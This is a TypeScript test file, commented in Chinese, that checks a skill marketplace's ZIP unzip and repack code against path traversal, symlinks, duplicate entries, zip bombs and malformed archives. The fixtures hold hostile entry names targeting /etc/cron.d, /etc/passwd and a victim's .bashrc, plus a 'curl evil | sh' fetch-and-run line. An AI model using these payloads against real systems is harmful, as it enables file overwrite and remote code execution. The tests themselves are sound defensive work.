/**
 * ZIP 解压与重打包的路径安全。
 *
 * 这里测的是一条真实的攻击链：上传一个 entry 名为 `../../../../etc/cron.d/x`
 * 的 ZIP，让它落进 `skills.metadata.sourceFiles`，再由 `buildSkillPackage` /
 * `createZipStore` 重新打包发给买家，买家 `unzip` 时就把文件写到了目标目录
 * 之外。读取侧和写入侧都要拦，所以两侧都在这里测。
 */

import { describe, expect, it } from "vitest"
import { createZipStore } from "../lib/zip/create-zip-store"
import {
  safeZipEntryPath,
  sanitizeZipEntryPath,
} from "../lib/zip/sanitize-entry-path"
import {
  hasUnsafeArchive,
  unsafeRejections,
  unzipTextFiles,
  unzipTextFilesWithReport,
} from "../lib/zip/unzip-text"
import { buildSkillPackage } from "../lib/agent-install/skill-package"
import { deflateRawSync } from "node:zlib"

type RawEntry = {
  path: string
  content: string
  /** 覆盖本地头/中央目录里的解压后尺寸，用来伪造炸弹声明值。 */
  declaredSize?: number
  store?: boolean
  /**
   * 把这个 entry 标记为 Unix 符号链接。payload 就是链接目标路径，真实
   * 打包器（`zip -y`）也是这么存的。
   */
  symlink?: boolean
  /** 写入的本地头偏移，通常不需要显式给。 */
  localOffset?: number
}

/**
 * 造一个多 entry 的 ZIP 用于测试。
 *
 * 不复用 `createZipStore`：它是被测对象之一，用它造输入会让"能读出自己写的
 * 东西"看起来像通过。也不能每个 entry 各自造一个完整包再 concat —— 那是两个
 * 独立归档的拼接，第一个中央目录就会让读取循环提前退出，于是只有第一个 entry
 * 被测到。
 */
function makeZip(entries: RawEntry[]): Buffer {
  const locals: Buffer[] = []
  const centrals: Buffer[] = []
  let offset = 0

  for (const entry of entries) {
    const data = Buffer.from(entry.content, "utf8")
    const method = entry.store ? 0 : 8
    const payload = entry.store ? data : deflateRawSync(data)
    const name = Buffer.from(entry.path, "utf8")
    const declared = entry.declaredSize ?? data.length

    const local = Buffer.alloc(30)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt16LE(20, 4)
    local.writeUInt16LE(0, 6) // flags
    local.writeUInt16LE(method, 8)
    local.writeUInt32LE(0, 10) // time
    local.writeUInt32LE(0, 12) // date
    local.writeUInt32LE(0, 14) // crc
    local.writeUInt32LE(payload.length, 18)
    local.writeUInt32LE(declared, 22)
    local.writeUInt16LE(name.length, 26)
    local.writeUInt16LE(0, 28)

    const central = Buffer.alloc(46)
    central.writeUInt32LE(0x02014b50, 0)
    // 高字节是打包主机系统：0x03 = Unix。符号链接的 st_mode 只在 Unix 打包器
    // 写出来的包里才有效，所以这里必须真的是 Unix 而不是 0。
    central.writeUInt16LE(entry.symlink ? 0x0314 : 0x0014, 4)
    central.writeUInt16LE(20, 6)
    central.writeUInt16LE(method, 8)
    central.writeUInt32LE(0, 10)
    central.writeUInt32LE(0, 12)
    central.writeUInt32LE(0, 14)
    central.writeUInt32LE(0, 16) // crc
    central.writeUInt32LE(payload.length, 20)
    central.writeUInt32LE(declared, 24)
    central.writeUInt16LE(name.length, 28)
    // external attributes 高 16 位在 Unix 打包器下就是 st_mode。
    // 0xA1FF = S_IFLNK | 0777，即一个可写的符号链接。
    if (entry.symlink) {
      central.writeUInt32LE(0xa1ff0000, 38)
    } else if (entry.localOffset !== undefined) {
      central.writeUInt32LE(0x81a40000, 38)
    }
    central.writeUInt32LE(entry.localOffset ?? offset, 42)

    locals.push(Buffer.concat([local, name, payload]))
    centrals.push(Buffer.concat([central, name]))
    offset += local.length + name.length + payload.length
  }

  const central = Buffer.concat(centrals)
  const end = Buffer.alloc(22)
  end.writeUInt32LE(0x06054b50, 0)
  end.writeUInt16LE(entries.length, 8)
  end.writeUInt16LE(entries.length, 10)
  end.writeUInt32LE(central.length, 12)
  end.writeUInt32LE(offset, 16)

  return Buffer.concat([...locals, central, end])
}

/**
 * 从中央目录读回 store 模式 ZIP 里的 entry 名。
 *
 * 必须读中央目录而不是本地头：写入端"拒绝穿越路径"要断言的正是最终包里没有
 * 那一条，只看本地头会漏掉"名字还留着但内容没写"的中间状态。
 */
function readZipStoreNames(buf: Buffer): string[] {
  const names: string[] = []
  // 中央目录在本地头之后，偏移写在 EOCD 里。先用 EOCD 定位再走目录，
  // 从 0 开始扫会在第一个本地头的 payload 里误命中签名。
  const eocd = buf.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]))
  if (eocd < 0) return names
  let offset = buf.readUInt32LE(eocd + 16)
  while (offset + 46 <= buf.length) {
    if (buf.readUInt32LE(offset) !== 0x02014b50) break
    const nameLen = buf.readUInt16LE(offset + 28)
    const extraLen = buf.readUInt16LE(offset + 30)
    const commentLen = buf.readUInt16LE(offset + 32)
    names.push(
      buf.subarray(offset + 46, offset + 46 + nameLen).toString("utf8")
    )
    offset += 46 + nameLen + extraLen + commentLen
  }
  return names
}

describe("sanitizeZipEntryPath", () => {
  it("rejects every traversal form, not just a normalized one", () => {
    // `a/../../b` 规范化后仍在根内，但"尝试过穿越"本身就是拒绝的理由：
    // 逐层规范化后再判断会漏掉写法和解析歧义。
    for (const raw of [
      "../evil.md",
      "../../etc/passwd",
      "a/../../etc/passwd",
      "a/b/../../../x.md",
      "..",
      "..\\evil.md",
      "a\\..\\..\\evil.md",
      "/../evil.md",
    ]) {
      expect(sanitizeZipEntryPath(raw).ok, raw).toBe(false)
    }
  })

  it("strips leading slashes instead of rejecting them", () => {
    // `/etc/passwd` 作为 entry 名在 ZIP 规范里是合法的绝对路径。直接拒掉会
    // 误伤 `zip -r /skills ./pkg` 这类正常打包，所以规整而不是拒绝。
    expect(safeZipEntryPath("/docs/README.md")).toBe("docs/README.md")
    expect(safeZipEntryPath("///docs/README.md")).toBe("docs/README.md")
  })

  it("normalizes backslashes and redundant segments", () => {
    expect(safeZipEntryPath("pkg\\src\\index.ts")).toBe("pkg/src/index.ts")
    expect(safeZipEntryPath("pkg//src/index.ts")).toBe("pkg/src/index.ts")
    expect(safeZipEntryPath("pkg/./src/index.ts")).toBe("pkg/src/index.ts")
  })

  it("rejects NUL and control characters", () => {
    expect(safeZipEntryPath("skill.md\u0000.txt")).toBeNull()
    expect(safeZipEntryPath("skill\n.md")).toBeNull()
  })

  it("rejects Windows reserved device names", () => {
    // `NUL` 在 Windows 上是设备：解压"成功"但写不到文件，且不同工具行为不一致。
    expect(safeZipEntryPath("NUL.md")).toBeNull()
    expect(safeZipEntryPath("pkg/CON.txt")).toBeNull()
    expect(safeZipEntryPath("lpt1")).toBeNull()
    // 大小写不敏感，Windows 也不敏感。
    expect(safeZipEntryPath("aux.md")).toBeNull()
  })

  it("keeps names that merely contain a dot segment", () => {
    expect(safeZipEntryPath("pkg/..hidden/file.md")).toBe(
      "pkg/..hidden/file.md"
    )
    expect(safeZipEntryPath("pkg/a..b.md")).toBe("pkg/a..b.md")
  })

  it("caps path length", () => {
    expect(safeZipEntryPath(`${"a".repeat(300)}.md`)).toBeNull()
  })

  it("rejects Windows drive-absolute paths", () => {
    // 之前只去掉了前导斜杠，`C:\Windows\System32` 没有前导斜杠所以漏过。
    // 在 Windows 上解压它会写到目标根之外，和 `../` 是同一类后果。
    for (const raw of [
      "C:/Windows/System32/evil.dll",
      "C:\\Windows\\System32\\evil.dll",
      "c:/temp/x.md",
      "Z:evil.md",
    ]) {
      expect(safeZipEntryPath(raw), raw).toBeNull()
    }
  })
})

describe("unzipTextFiles symlinks", () => {
  it("rejects a symlink entry and keeps its payload out", () => {
    // 链接的 payload 就是目标路径这一串文本。读进来"无害"，但下游按它写盘
    // 就会把宿主机上的目标替换掉 —— `/etc/passwd` 只是个好认的例子。
    const zip = makeZip([
      { path: "SKILL.md", content: "# ok" },
      { path: "pkg/passwd", content: "/etc/passwd", symlink: true },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)

    expect(files.map((f) => f.path)).toEqual(["SKILL.md"])
    expect(files.some((f) => f.content.includes("/etc/passwd"))).toBe(false)
    expect(rejections.some((r) => r.kind === "symlink")).toBe(true)
    expect(hasUnsafeArchive(rejections)).toBe(true)
  })

  it("does not misread a DOS-built archive as a symlink", () => {
    // DOS 打包器的 external attributes 高位不是 st_mode，是 dos 属性位。
    // 把它当 mode 解读会把一个普通文件误判成链接，把正常包整个打回。
    const zip = makeZip([
      { path: "SKILL.md", content: "# ok" },
      { path: "docs/readme.md", content: "hello", localOffset: 0 },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)
    expect(files.map((f) => f.path)).toContain("docs/readme.md")
    expect(rejections).toEqual([])
  })
})

describe("unzipTextFiles duplicate entries", () => {
  it("rejects a package with the same normalized path twice", () => {
    // `a//b.md` 与 `a/b.md` 规整后是同一个路径。不去重的话下游按数组顺序
    // 写入，最后一条静默覆盖前一条，买家拿到的内容取决于顺序。
    const zip = makeZip([
      { path: "SKILL.md", content: "# ok" },
      { path: "pkg/a.md", content: "first" },
      { path: "pkg//a.md", content: "second" },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)

    expect(files.map((f) => f.path)).toEqual(["SKILL.md", "pkg/a.md"])
    expect(files.find((f) => f.path === "pkg/a.md")?.content).toBe("first")
    expect(rejections.some((r) => r.kind === "duplicate-entry")).toBe(true)
  })
})

describe("unzipTextFiles central directory", () => {
  it("fails closed when the central directory is missing", () => {
    // 只留本地头、不留中央目录的包：无法判断 entry 是不是符号链接，也无法
    // 核对数量。这时"尽力解析"等于放弃前面两道检查，所以整包拒绝。
    const zip = makeZip([{ path: "SKILL.md", content: "# ok" }])
    // EOCD 固定 22 字节，落在包尾；中央目录起始偏移在 EOCD+16。截到中央
    // 目录之前，留下一堆本地头但没有目录可校验。
    const eocdAt = zip.length - 22
    const stripped = zip.subarray(0, zip.readUInt32LE(eocdAt + 16))

    const { files, rejections } = unzipTextFilesWithReport(stripped)
    expect(files).toEqual([])
    expect(
      rejections.some((r) => r.kind === "malformed-central-directory")
    ).toBe(true)
    expect(hasUnsafeArchive(rejections)).toBe(true)
  })

  it("fails closed when EOCD counts more entries than exist", () => {
    const zip = makeZip([{ path: "SKILL.md", content: "# ok" }])
    // EOCD 在最后 22 字节起头；entry 数在 +10，声明 5 条但只有 1 条。
    const tampered = Buffer.from(zip)
    tampered.writeUInt16LE(5, tampered.length - 22 + 10)

    const { files, rejections } = unzipTextFilesWithReport(tampered)
    expect(files).toEqual([])
    expect(
      rejections.some((r) => r.kind === "malformed-central-directory")
    ).toBe(true)
  })
})

describe("hasUnsafeArchive", () => {
  it("separates security rejections from abuse limits", () => {
    // 体积/比值/entry 数只是防滥用，不该把正常上传整个打回；穿越、链接、
    // 重复路径、目录不一致才是安全事件。
    expect(hasUnsafeArchive([])).toBe(false)
    expect(hasUnsafeArchive([{ kind: "entry-size", detail: "" }])).toBe(false)
    expect(hasUnsafeArchive([{ kind: "ratio", detail: "" }])).toBe(false)
    expect(hasUnsafeArchive([{ kind: "too-many-entries", detail: "" }])).toBe(
      false
    )
    expect(hasUnsafeArchive([{ kind: "symlink", detail: "" }])).toBe(true)
    expect(hasUnsafeArchive([{ kind: "duplicate-entry", detail: "" }])).toBe(
      true
    )
    // 体积类与安全类混在一起时，以安全类为准。
    expect(
      unsafeRejections([
        { kind: "entry-size", detail: "a" },
        { kind: "path-traversal", detail: "b" },
      ])
    ).toHaveLength(1)
  })
})

describe("unzipTextFiles path safety", () => {
  it("drops traversal entries and reports them", () => {
    const zip = makeZip([
      { path: "SKILL.md", content: "# ok" },
      { path: "../../../etc/cron.d/pwn", content: "payload" },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)

    expect(files.map((f) => f.path)).toEqual(["SKILL.md"])
    expect(rejections).toHaveLength(1)
    expect(rejections[0]?.kind).toBe("path-traversal")
  })

  it("drops traversal directories too", () => {
    // 目录条目本身不写文件，但下游常见 `mkdir -p dirname(entryPath)`，
    // 一个名为 `../../evil/` 的目录就够了。
    const zip = makeZip([
      { path: "SKILL.md", content: "# ok" },
      { path: "../../../evil/", content: "" },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)
    expect(files.map((f) => f.path)).toEqual(["SKILL.md"])
    expect(rejections.some((r) => r.kind === "path-traversal")).toBe(true)
  })

  it("still returns nothing rather than throwing on an all-malicious archive", () => {
    const zip = makeZip([
      { path: "../a.md", content: "x" },
      { path: "../b.md", content: "y" },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)
    expect(files).toEqual([])
    expect(rejections).toHaveLength(2)
  })
})

describe("unzipTextFiles resource limits", () => {
  it("rejects a single oversized entry by declared size, before inflating", () => {
    // 声明 64MB、实际只给 1KB。关键是要在 inflate 之前拒：如果先 inflate 再
    // 检查，攻击者已经把内存吃掉了。
    const zip = makeZip([
      {
        path: "big.md",
        content: "x".repeat(1024),
        declaredSize: 64 * 1024 * 1024,
      },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip, {
      maxEntryUncompressedBytes: 1024,
    })
    expect(files).toEqual([])
    expect(rejections.some((r) => r.kind === "entry-size")).toBe(true)
  })

  it("enforces a cumulative uncompressed budget across entries", () => {
    const zip = makeZip([
      { path: "a.md", content: "x".repeat(600) },
      { path: "b.md", content: "x".repeat(600) },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip, {
      maxEntryUncompressedBytes: 1024,
      maxTotalUncompressedBytes: 800,
    })
    expect(files.map((f) => f.path)).toEqual(["a.md"])
    expect(rejections.some((r) => r.kind === "total-size")).toBe(true)
  })

  it("rejects a high compression ratio (zip bomb shape)", () => {
    const bomb = "A".repeat(200_000)
    const zip = makeZip([{ path: "bomb.md", content: bomb }])
    const { files, rejections } = unzipTextFilesWithReport(zip, {
      maxRatio: 200,
    })
    expect(files).toEqual([])
    expect(rejections.some((r) => r.kind === "ratio")).toBe(true)
  })

  it("caps entries scanned, including non-text ones", () => {
    // 旧实现的循环条件是 `files.length < maxFiles`，而 `.exe` 不计入 files，
    // 于是这个包会被完整扫完。这里的 `.exe` 一条都不该被保留，但扫描本身
    // 必须在达到上限后停下。
    const entries = Array.from({ length: 50 }, (_, i) => ({
      path: `tool${i}.exe`,
      content: "MZ",
    }))
    entries.push({ path: "SKILL.md", content: "# ok" })
    const zip = makeZip(entries)

    const { files, rejections, entriesScanned } = unzipTextFilesWithReport(
      zip,
      {
        maxEntries: 10,
        maxFiles: 200,
      }
    )
    expect(entriesScanned).toBeLessThanOrEqual(10)
    expect(rejections.some((r) => r.kind === "too-many-entries")).toBe(true)
    expect(files.map((f) => f.path)).toEqual([])
  })

  it("still honours the legacy maxFiles positional argument", () => {
    const zip = makeZip([
      { path: "a.md", content: "a" },
      { path: "b.md", content: "b" },
    ])
    expect(unzipTextFiles(zip, 1)).toHaveLength(1)
  })

  it("reads a normal package unchanged", () => {
    const zip = makeZip([
      { path: "pkg/SKILL.md", content: "# Skill\nname: demo" },
      { path: "pkg/src/index.ts", content: "export const a = 1" },
      { path: "pkg/logo.png", content: "binary" },
    ])
    const { files, rejections } = unzipTextFilesWithReport(zip)
    expect(rejections).toEqual([])
    expect(files.map((f) => f.path)).toEqual([
      "pkg/SKILL.md",
      "pkg/src/index.ts",
    ])
    expect(files[0]?.content).toContain("name: demo")
  })
})

describe("createZipStore write-side safety", () => {
  it("refuses to emit a traversing entry name", () => {
    const buf = createZipStore([
      { path: "../escape.md", content: "pwn" },
      { path: "SKILL.md", content: "# ok" },
    ])
    const names = readZipStoreNames(buf)
    expect(names).toEqual(["SKILL.md"])
  })

  it("round-trips safe names unchanged", () => {
    const buf = createZipStore([
      { path: "pkg/SKILL.md", content: "# ok" },
      { path: "pkg\\src\\index.ts", content: "x" },
    ])
    expect(readZipStoreNames(buf)).toEqual(["pkg/SKILL.md", "pkg/src/index.ts"])
  })
})

describe("buildSkillPackage sanitizes stored sourceFiles", () => {
  const base = { id: "sk_1", slug: "demo", title: "Demo" }

  it("drops traversal paths from historical metadata", () => {
    // `sourceFiles` 是 DB 里的历史数据：修读取侧之前已经导入过的脏数据还在，
    // 所以组装发给买家的包时必须再拦一次。
    const result = buildSkillPackage({
      ...base,
      sourceFiles: [
        { path: "../../../../home/victim/.bashrc", content: "curl evil | sh" },
        { path: "src/index.ts", content: "export const a = 1" },
      ],
    })
    const paths = result.files.map((f) => f.path)
    expect(paths).not.toContain("../../../../home/victim/.bashrc")
    expect(paths).toContain("src/index.ts")
    expect(paths.every((p) => !p.includes(".."))).toBe(true)
  })

  it("still emits a generated SKILL.md when every stored path is hostile", () => {
    const result = buildSkillPackage({
      ...base,
      sourceFiles: [{ path: "../evil.md", content: "x" }],
    })
    expect(result.files.some((f) => f.path === "SKILL.md")).toBe(true)
    expect(result.files).toHaveLength(1)
  })

  it("keeps a stored SKILL.md at a nested path", () => {
    // 嵌套的 `pkg/SKILL.md` 之前会被当成普通文件保留，同时又生成一份根级
    // SKILL.md，买家拿到两份互相矛盾的说明书。
    const result = buildSkillPackage({
      ...base,
      sourceFiles: [{ path: "pkg/SKILL.md", content: "# stored" }],
    })
    const skillMds = result.files.filter(
      (f) => f.path.toLowerCase() === "skill.md"
    )
    expect(skillMds).toHaveLength(1)
    expect(skillMds[0]?.content).toBe("# stored")
    expect(result.files).toHaveLength(1)
  })
})
